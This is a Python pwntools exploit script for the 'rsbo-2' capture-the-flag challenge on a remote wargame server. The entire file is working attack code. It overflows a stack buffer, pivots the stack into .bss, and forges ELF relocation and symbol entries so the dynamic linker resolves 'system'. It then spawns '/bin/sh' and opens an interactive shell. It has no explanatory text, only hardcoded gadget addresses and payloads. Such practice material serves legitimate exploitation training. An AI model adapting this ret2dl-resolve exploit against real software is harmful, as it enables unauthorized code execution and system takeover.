# -*- coding:utf-8 -*-
from pwn import *
#context.log_level = 'debug'
#p = process('./rsbo-2')
p = remote('hackme.inndy.tw',7706)
elf = ELF('./rsbo-2')

#--------------------------------------------#
read_plt = elf.plt['read']
alarm_plt = elf.plt['alarm']
pop_ebp_ret = 0x0804879f
ppp_ret = 0x0804879d
pp_ebp_ret = 0x0804879e
leave_ret = 0x080484f8
bss_addr = 0x0804a020 + 0x100
stack_size = 0x800
base_stage = bss_addr + stack_size
plt_0 = 0x80483d0 # objdump -d -j .plt rsbo-2
rel_plt = 0x8048354 # objdump -s -j .rel.plt rsbo-2
dynsym = 0x080481cc #readelf -S rsbo-2
dynstr = 0x0804829c #readelf -S rsbo-2
alarm_got = elf.got['alarm']
#--------------------------------------------#


index_offset = (base_stage + 28) - rel_plt
print "alarm_got: ",hex(alarm_got)
print "alarm_plt: ",hex(alarm_plt)
print "read_plt: ",hex(read_plt)
fake_sym_addr = base_stage + 36
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10
r_info = index_dynsym << 8 | 0x7
fake_reloc = p32(alarm_got) + p32(r_info)
st_name = fake_sym_addr + 0x10 - dynstr
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)



payload = '\x00'*104 + p32(bss_addr)
payload += p32(read_plt) + p32(leave_ret) + p32(0) + p32(bss_addr) + p32(36) 

#gdb.attach(p)
p.send(payload)
sleep(1)
# raw_input("go:")

#fake stack 1 bss_addr
payload1 = 'aaaa' #pop ebp
payload1 += p32(read_plt) + p32(ppp_ret) + p32(0) + p32(base_stage) + p32(100)
payload1 += p32(pop_ebp_ret) + p32(base_stage) #fake stack again
payload1 += p32(leave_ret) #leave: mov esp,ebp; pop ebp
p.send(payload1)
sleep(1)
#raw_input("go:")

cmd = "/bin/sh"
#fake stack 2 base_stage
payload2 = 'bbbb'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += 'aaaa'
payload2 += p32(base_stage + 80)
payload2 += 'aaaa'
payload2 += 'aaaa'
payload2 += fake_reloc #base_stage+28
payload2 += 'b' * align
payload2 += fake_sym #base_stage+36
payload2 += "system\x00"
payload2 += 'a' * (80 - len(payload2))
payload2 += cmd +'\x00'
payload2 += 'a' * (100 - len(payload2))
#print len(payload2)
p.send(payload2)
p.interactive()